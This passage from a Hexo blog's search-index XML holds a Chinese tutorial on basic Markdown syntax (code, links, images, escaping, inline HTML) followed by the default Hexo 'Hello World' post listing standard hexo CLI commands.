src="/2023/03/09/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/Tux.png" alt="Tux, the Linux mascot"></p></li><li><p>Close the file.</p></li></ol><p>列表：</p><ol><li>First item</li><li>Second item</li><li>Third item<ul><li>Indented item</li><li>Indented item</li></ul></li><li>Fourth item</li></ol><h2 id="6-markdown代码语法"><a href="#6-markdown代码语法" class="headerlink" title="6. markdown代码语法"></a>6. markdown代码语法</h2><p>要将单词或短语表示为代码，需将其包裹在反引号中。<br><br>例： </p><pre><code class="hljs">At the command prompt, type `nano`.  </code></pre><p>At the command prompt, type <code>nano</code>.</p><h3 id="转义反引号"><a href="#转义反引号" class="headerlink" title="转义反引号"></a>转义反引号</h3><p>若要表示为代码的单词或短语中包含一个或多个反引号，则可以通过将单词或短语包裹在双反引号中。<br>例： </p><pre><code class="hljs">``Use `code` in your Markdown file.``</code></pre><p><code>Use `code` in your Markdown file.</code></p><h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><p>要创建代码块，需要将代码块的每一行缩进至少四个空格或制表符。<br></p><pre><code class="hljs">&lt;html&gt;  &lt;head&gt;  &lt;/head&gt;&lt;/html&gt;</code></pre><p>注意：要创建不用缩进的代码块，需使用围栏式代码块。</p><h2 id="7-markdown分割线语法"><a href="#7-markdown分割线语法" class="headerlink" title="7. markdown分割线语法"></a>7. markdown分割线语法</h2><p>要创建分割线，需在单独一行上使用三个或多个星号、破折号或下划线，且不能包含其他内容。<br><br>***<br><br>-—<br><br>___</p><hr><hr><hr><p>为了兼容性，在分隔线前后均添加空白行。</p><h2 id="8-markdown链接语法"><a href="#8-markdown链接语法" class="headerlink" title="8. markdown链接语法"></a>8. markdown链接语法</h2><p>链接文本放在中括号内，链接地址放在后面的括号中，链接title可选。<br>超链接markdown语法代码：<br></p><pre><code class="hljs">[超链接显示名](超链接地址 &quot;超链接title&quot;)  </code></pre><p>例： </p><pre><code class="hljs">这是一个链接 [Markdown语法](https://markdown.com.cn)。</code></pre><p>这是一个链接 <a href="https://markdown.com.cn/">Markdown语法</a></p><h3 id="给链接增加title"><a href="#给链接增加title" class="headerlink" title="给链接增加title"></a>给链接增加title</h3><p>链接title是当鼠标悬停在链接上时会出现的文字，这个title是可选的，他放在圆括号中链接地址后面，跟链接地址之间以空格分隔。<br><br>例： </p><pre><code class="hljs">这是一个链接 [Markdown语法](https://markdown.com.cn &quot;最好的markdown教程&quot;)。</code></pre><p>这是一个链接 <a href="https://markdown.com.cn/" title="最好的markdown教程">Markdown语法</a>。</p><h3 id="网址和Email地址"><a href="#网址和Email地址" class="headerlink" title="网址和Email地址"></a>网址和Email地址</h3><p>使用尖括号可以很方便地把URL或者Email地址变成可点击的链接。<br>例：  </p><pre><code class="hljs">&lt;https://markdown.com.cn&gt;  &lt;fake@example.com&gt;</code></pre><p><a href="https://markdown.com.cn/">https://markdown.com.cn</a><br><a href="mailto:&#102;&#x61;&#107;&#101;&#x40;&#x65;&#120;&#97;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#111;&#109;">&#102;&#x61;&#107;&#101;&#x40;&#x65;&#120;&#97;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#111;&#109;</a></p><h3 id="带格式化的链接"><a href="#带格式化的链接" class="headerlink" title="带格式化的链接"></a>带格式化的链接</h3><p>强调链接，在链接语法前后增加星号。要将链接表示为代码，要在方括号内添加反引号。</p><pre><code class="hljs">I love supporting the **[EFF](https://eff.org)**.&lt;br&gt;This is the *[Markdown Guide](https://www.markdownguide.org)*.&lt;br&gt;See the section on [`code`](#code).</code></pre><p>I love supporting the <strong><a href="https://eff.org/">EFF</a></strong>.<br><br>This is the <em><a href="https://www.markdownguide.org/">Markdown Guide</a></em>.<br><br>See the section on <a href="#code"><code>code</code></a>.</p><h3 id="引用类型链接"><a href="#引用类型链接" class="headerlink" title="引用类型链接"></a>引用类型链接</h3><p>引用样式链接是一种特殊的链接，它使URL在Markdown中更易于显示和阅读。参考样式链接分为两部分：与文本保持内联的部分以及存储在文件中其他位置的部分，以使文本易于阅读。</p><h4 id="链接的第一部分格式"><a href="#链接的第一部分格式" class="headerlink" title="链接的第一部分格式"></a>链接的第一部分格式</h4><p>引用类型的链接的第一部分使用两组括号进行格式设置。第一组方括号包围应显示为链接的文本。第二组括号显示了一个标签，该标签用于指向您存储在文档其他位置的链接。</p><p>尽管不是必需的，可以在第一组和第二组括号之间包含一个空格。第二组括号中的标签不区分大小写，可以包含字母，数字，空格或标点符号。</p><p>例：<br><br>[hobbit-hole][1]<br>[hobbit-hole] [1]</p><h4 id="链接的第二部分格式"><a href="#链接的第二部分格式" class="headerlink" title="链接的第二部分格式"></a>链接的第二部分格式</h4><p>引用类型链接的第二部分使用以下属性设置格式：</p><ol><li>放在括号中的标签，其后紧跟一个冒号和至少一个空格（例如[label]:）。</li><li>链接的URL，可以选择将其括在尖括号中。</li><li>链接的可选标题，可以将其括在双引号，单引号或括号中。<br>例：<br>[1]: <a href="https://en.wikipedia.org/wiki/Hobbit#Lifestyle">https://en.wikipedia.org/wiki/Hobbit#Lifestyle</a></li></ol><p>可以将链接的第二部分放在Markdown文档中的任何位置。有些人将它们放在出现的段落之后，有些人则将它们放在文档的末尾（例如尾注或脚注）。</p><pre><code class="hljs">注意：不同的 Markdown 应用程序处理URL中间的空格方式不一样。为了兼容性，请尽量使用%20代替空格。</code></pre><h2 id="9-markdown图片语法"><a href="#9-markdown图片语法" class="headerlink" title="9. markdown图片语法"></a>9. markdown图片语法</h2><p>要添加图像，请使用感叹号 (!), 然后在方括号增加替代文本，图片链接放在圆括号里，括号里的链接后可以增加一个可选的图片标题文本。</p><p>插入图片Markdown语法代码：</p><pre><code class="hljs">![图片alt](图片链接 &quot;图片title&quot;)。  </code></pre><p>例：  </p><pre><code class="hljs">![这是图片](/philly-magic-garden.jpg &quot;Magic Gardens&quot;)</code></pre><p><img src="/2023/03/09/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/philly-magic-garden.jpg" alt="这是图片" title="Magic Gardens"></p><h3 id="链接图片"><a href="#链接图片" class="headerlink" title="链接图片"></a>链接图片</h3><pre><code class="hljs">[![沙漠中的岩石图片](/shiprock.jpg &quot;Shiprock&quot;)](https://markdown.com.cn)</code></pre><p><a href="https://markdown.com.cn/"><img src="/2023/03/09/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/shiprock.jpg" alt="沙漠中的岩石图片" title="Shiprock"></a></p><h2 id="10-markdown转义字符语法"><a href="#10-markdown转义字符语法" class="headerlink" title="10. markdown转义字符语法"></a>10. markdown转义字符语法</h2><p>要显示原本用于格式化 Markdown 文档的字符，请在字符前面添加反斜杠字符 \ 。<br>如：  </p><pre><code class="hljs">\* Without the backslash, this would be a bullet in an unordered list.</code></pre><p>* Without the backslash, this would be a bullet in an unordered list.</p><h3 id="可做转义的字符"><a href="#可做转义的字符" class="headerlink" title="可做转义的字符"></a>可做转义的字符</h3><p>‘\‘, ‘ 、’, ‘*’, ‘_’, ‘{}’, ‘[]’, ‘()’, ‘#’, ‘+’, ‘-‘, ‘.’, ‘!’, ‘|’等都可通过反斜杠字符从而达到转义目的。</p><h3 id="特殊字符自动转义"><a href="#特殊字符自动转义" class="headerlink" title="特殊字符自动转义"></a>特殊字符自动转义</h3><p>在 HTML 文件中，有两个字符需要特殊处理： &lt; 和 &amp; 。 &lt; 符号用于起始标签，&amp; 符号则用于标记 HTML 实体，如果你只是想要使用这些符号，你必须要使用实体的形式，像是 &lt; 和 &amp;。</p><p>&amp; 符号其实很容易让写作网页文件的人感到困扰，如果你要打「AT&amp;T」 ，你必须要写成「AT&amp;amp;T」 ，还得转换网址内的 &amp; 符号，如果你要链接到：<a href="http://images.google.com/imagesnum=30&q=larry+bird">http://images.google.com/imagesnum=30&amp;q=larry+bird</a><br>必须将网站转成 <a href="http://images.google.com/imagesnum=30/&amp;q=larry+bird">http://images.google.com/imagesnum=30\&amp;q=larry+bird</a> 才能放到链接标签的 href 属性里。不用说也知道这很容易忘记，这也可能是 HTML 标准检查所检查到的错误中，数量最多的。<br>Markdown 允许你直接使用这些符号，它帮你自动转义字符。如果你使用 &amp; 符号的作为 HTML 实体的一部分，那么它不会被转换，而在其它情况下，它则会被转换成 &amp;amp;。所以你如果要在文件中插入一个著作权的符号，你可以这样写：&amp;copy;Markdown 将不会对这段文字做修改，但是如果你这样写：AT&amp;T;Markdown 就会将它转为：AT&amp;amp;T.类似的状况也会发生在 &lt; 符号上，因为 Markdown 支持 行内 HTML ，如果你使用 &lt; 符号作为 HTML 标签的分隔符，那 Markdown 也不会对它做任何转换，但是如果你是写：4&lt;5 Markdown 将会把它转换为：4 &amp;lt; 5.</p><h2 id="11-markdown内嵌HTML标签"><a href="#11-markdown内嵌HTML标签" class="headerlink" title="11. markdown内嵌HTML标签"></a>11. markdown内嵌HTML标签</h2><p>对于 Markdown 涵盖范围之外的标签，都可以直接在文件里面用 HTML 本身。如需使用 HTML，不需要额外标注这是 HTML 或是 Markdown，只需 HTML 标签添加到 Markdown 文本中即可。</p><h3 id="行级内联标签"><a href="#行级内联标签" class="headerlink" title="行级内联标签"></a>行级内联标签</h3><p>HTML 的行级內联标签如 &lt;span&gt;、&lt;cite&gt;、&lt;del&gt; 不受限制，可以在 Markdown 的段落、列表或是标题里任意使用。依照个人习惯，甚至可以不用 Markdown 格式，而采用 HTML 标签来格式化。例如：如果比较喜欢 HTML 的 &lt;a&gt; 或 &lt;img&gt; 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图片语法。当你需要更改元素的属性时（例如为文本指定颜色或更改图像的宽度），使用 HTML 标签更方便些。</p><p>HTML 行级內联标签和区块标签不同，在內联标签的范围内， Markdown 的语法是可以解析的。<br>This <strong>word</strong> is bold. This &lt;em&gt;word&lt;&#x2F;em&gt; is italic.<br>渲染效果如下：<br>This <strong>word</strong> is bold. This <em>word</em> is italic.</p><h3 id="区块标签"><a href="#区块标签" class="headerlink" title="区块标签"></a>区块标签</h3><p>区块元素──比如 &lt;div&gt;、&lt;table&gt;、&lt;pre&gt;、&lt;p&gt; 等标签，必须在前后加上空行，以便于内容区分。而且这些元素的开始与结尾标签，不可以用 tab 或是空白来缩进。Markdown 会自动识别这区块元素，避免在区块标签前后加上没有必要的 &lt;p&gt; 标签。</p><p>请注意，Markdown 语法在 HTML 区块标签中将不会被进行处理。例如，你无法在 HTML 区块内使用 Markdown 形式的<em>强调</em>。</p>]]></content>
    
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/03/08/hello-world/"/>
    <url>/2023/03/08/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
